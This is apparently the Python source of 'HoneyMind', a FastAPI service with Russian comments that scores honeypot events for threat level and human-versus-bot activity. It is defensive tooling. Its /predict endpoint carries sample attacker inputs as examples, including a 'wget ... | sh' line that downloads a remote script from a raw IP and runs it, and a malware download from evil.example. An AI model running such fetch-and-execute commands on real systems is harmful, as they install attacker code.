"""FastAPI-сервис HoneyMind. Контракт для бэкенда:

    POST /predict   {payload любой из поддерживаемых схем}
    →  {"threat_score": 85, "category": "malware_downloader", "is_human": null, ...доп. поля}

Переменные окружения:
    HONEYMIND_MODEL   путь к модели (по умолчанию models/honeymind.joblib); нет файла → работает только на правилах
    HONEYMIND_HUMAN_MODEL  модель «человек/бот» для /session (по умолчанию models/human.json); нет → эвристика по темпу
    HONEYMIND_TOKEN   если задан — требуется заголовок Authorization: Bearer <token> (кроме /health)
    HONEYMIND_DOCS    "0" отключает /docs и /openapi.json (по умолчанию включено)
    HONEYMIND_MAX_BODY  максимальный размер тела, байт (по умолчанию 65536)
"""
from __future__ import annotations

import hmac
import logging
import os
import time
from pathlib import Path
from typing import Any

from fastapi import Body, Depends, FastAPI, Header, HTTPException
from pydantic import BaseModel, Field

from .analyzer import Analyzer
from .humanness import HUMAN_MODEL_VERSION, HumanModel
from .model import MODEL_VERSION, ThreatModel

log = logging.getLogger("honeymind")
ROOT = Path(__file__).resolve().parent.parent
MAX_BODY = int(os.getenv("HONEYMIND_MAX_BODY", "65536"))
MAX_BATCH = 200
MAX_SESSION = 500


class PredictOut(BaseModel):
    threat_score: int = Field(ge=0, le=100, description="0 — безобидно, 100 — критично")
    category: str
    is_human: bool | None = Field(None, description="null — по одному событию определить нельзя; см. /session")
    confidence: float
    needs_review: bool
    source: str
    event_kind: str
    matched_rules: list[str]
    mitre: list[str]
    summary: str
    model_version: str | None


class BatchIn(BaseModel):
    events: list[dict[str, Any]] = Field(max_length=MAX_BATCH)


class SessionIn(BaseModel):
    events: list[dict[str, Any]] = Field(max_length=MAX_SESSION)


class BodyLimitMiddleware:
    """ASGI-ограничитель размера тела: считает реально прочитанные байты (Content-Length можно подделать/опустить)."""

    def __init__(self, app, max_body: int):
        self.app, self.max_body = app, max_body

    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            return await self.app(scope, receive, send)
        for k, v in scope.get("headers", []):
            if k == b"content-length":
                try:
                    if int(v) > self.max_body:
                        return await self._reject(send)
                except ValueError:
                    return await self._reject(send)
        seen = 0

        async def limited_receive():
            nonlocal seen
            msg = await receive()
            if msg["type"] == "http.request":
                seen += len(msg.get("body", b""))
                if seen > self.max_body:
                    raise _TooLarge()
            return msg

        try:
            await self.app(scope, limited_receive, send)
        except _TooLarge:
            await self._reject(send)

    async def _reject(self, send):
        body = b'{"detail":"request body too large"}'
        await send({"type": "http.response.start", "status": 413,
                    "headers": [(b"content-type", b"application/json"), (b"content-length", str(len(body)).encode())]})
        await send({"type": "http.response.body", "body": body})


class _TooLarge(Exception):
    pass


def load_analyzer() -> Analyzer:
    path = Path(os.getenv("HONEYMIND_MODEL", str(ROOT / "models" / "honeymind.joblib")))
    model = None
    if path.exists():
        try:
            model = ThreatModel.load(path)
            log.info("model loaded: %s (%s)", path.name, model.kind)
        except Exception as exc:  # noqa: BLE001 — сервис должен подняться хотя бы на правилах
            log.error("model NOT loaded (%s): %s — работаем только на правилах", path, exc)
    else:
        log.warning("model file %s not found — работаем только на правилах", path)
    hpath = Path(os.getenv("HONEYMIND_HUMAN_MODEL", str(ROOT / "models" / "human.json")))
    human = None
    if hpath.exists():
        try:
            human = HumanModel.load(hpath)
            log.info("human model loaded: %s (порог «человек» %.2f)", hpath.name, human.human_threshold)
        except Exception as exc:  # noqa: BLE001
            log.error("human model NOT loaded (%s): %s — is_human по эвристике", hpath, exc)
    else:
        log.warning("human model %s not found — is_human по эвристике", hpath)
    return Analyzer(model, human)


def create_app(analyzer: Analyzer | None = None) -> FastAPI:
    docs = os.getenv("HONEYMIND_DOCS", "1") != "0"
    app = FastAPI(title="HoneyForge HoneyMind", version=MODEL_VERSION,
                  docs_url="/docs" if docs else None, redoc_url=None, openapi_url="/openapi.json" if docs else None)
    app.add_middleware(BodyLimitMiddleware, max_body=MAX_BODY)
    app.state.analyzer = analyzer or load_analyzer()
    token = os.getenv("HONEYMIND_TOKEN", "")

    def auth(authorization: str | None = Header(default=None)) -> None:
        if not token:
            return
        supplied = (authorization or "").removeprefix("Bearer ").strip()
        if not hmac.compare_digest(supplied.encode(), token.encode()):
            raise HTTPException(status_code=401, detail="unauthorized", headers={"WWW-Authenticate": "Bearer"})

    @app.get("/health")
    def health() -> dict[str, Any]:
        a: Analyzer = app.state.analyzer
        return {"status": "ok", "model_loaded": a.model is not None, "model_kind": a.model.kind if a.model else None,
                "human_model_loaded": a.human_model is not None,
                "version": MODEL_VERSION, "human_version": HUMAN_MODEL_VERSION, "auth_required": bool(token)}

    @app.post("/predict", response_model=PredictOut, dependencies=[Depends(auth)])
    def predict(event: dict[str, Any] = Body(..., examples=[
        {"command": "wget http://45.9.148.12/x.sh -O- | sh"},
        {"event_type": "command_executed", "payload": {"command": "chmod +x virus.sh"}},
        {"event_type": "ssh_login_attempt", "payload": {"username": "root", "password": "123"}},
        {"event_type": "malware_download", "payload": {"file_hash": "ab12...", "url": "http://evil.example/bot"}},
    ])) -> dict[str, Any]:
        t0 = time.perf_counter()
        v = app.state.analyzer.analyze_event(event)
        log.info("predict kind=%s cat=%s score=%d src=%s %.1fms", v.kind, v.category, v.threat_score, v.source,
                 (time.perf_counter() - t0) * 1000)
        return v.to_dict()

    @app.post("/predict/batch", dependencies=[Depends(auth)])
    def predict_batch(body: BatchIn) -> dict[str, Any]:
        return {"results": [app.state.analyzer.analyze_event(e).to_dict() for e in body.events]}

    @app.post("/session", dependencies=[Depends(auth)])
    def session(body: SessionIn) -> dict[str, Any]:
        return app.state.analyzer.analyze_session(body.events)

    return app


app = create_app()
